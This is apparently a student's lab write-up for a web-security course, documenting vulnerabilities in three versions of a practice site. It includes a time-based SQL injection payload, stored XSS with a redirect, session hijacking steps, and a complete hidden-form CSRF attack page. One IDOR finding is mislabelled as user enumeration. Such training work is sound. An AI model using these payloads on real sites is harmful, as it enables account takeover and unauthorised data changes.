# Project 8 - Pentesting Live Targets

Time spent: **4** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: Session Hijacking
	<img src="https://i.imgur.com/1g4prFK.gif"/>
	* The session ID is found from the chrome developer tools console. 
	* The attacker changes the session ID using the provided change_session_id.php.
	* The attacker is now able to access the victims session.

Vulnerability #2: SQL Injection
	<img src="https://i.imgur.com/3keNk4f.gif" />
	* The exploit exists in the salesperson.php page.
	* The exploit is done via the url. 
	* Using the given ```' OR SLEEP(5)=0--'``` statement, the page proceeds to wait 5 seconds before returning.


## Green

Vulnerability #1: XSS
	<img src="https://i.imgur.com/wJbBp7O.gif"/>
	* This exploit is done via the feedback section. 
	* The XSS executes when a privileged user accesses the feedback page in the /staff/feedback/ section.


Vulnerability #2: User Enumeration
	<img src="https://i.imgur.com/EOH0sFs.gif"/>
	* Using the given username "jmonroe99" we can see that a valid username shows a bold error.
	* An incorrect username shows a not-bolded error.

Bonus: XSS
	<img src="https://i.imgur.com/zx8kPL7.gif"/>
	* This exploit is the same as the first XSS found.
	* The ```alert()``` statement is replaced with a ```window.location.assign()``` statement.

## Red

Vulnerability #1: CSRF
	<img src="https://i.imgur.com/WLeB4Gp.gif"/>
	* The attacker submits a malicious webpage into the feedback section.
	* The victim visits the url from the feedback.
	* The malicious webpage silently submits a form to the edit section of the victims page.
	``` <!DOCTYPE html>
		<html>
	<head>
		<title>Your Feedback</title>
		<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
	</head>
	<body>

		<p> you should secure your site</p>
		<style>
		.hide-form {
			display: none;
		}
		</style>
		<form action="https://104.154.100.160/red/public/staff/salespeople/edit.php?id=7" method="POST" class="hide-form" id="attackform"  name="form">
			<input type="text" name="first_name" value="Not Samuel" /><br />
			<input type="text" name="last_name" value="Not Hunter" /><br />
			<input type="text" name="phone" value="111-222-3333" /><br />
			<input type="text" name="email" value="changed_your_email_again@attack.com" /><br />
		</form>
		<script>
		$(function() {
			console.log("loaded");
			window.document.forms[0].submit(function(e) {


				console.log("submitted");
			});
		});
		</script>
	</html>```

Vulnerability #2: User Enumeration
	<img src="https://i.imgur.com/7IZ8N9k.gif"/>
	* By directly changing the 'id' parameter in the URL we can find salespersons not mentioned on the page.
	* ID's 10 and 11 shouldn't be accessible by everyone. 


## Notes

Describe any challenges encountered while doing the work

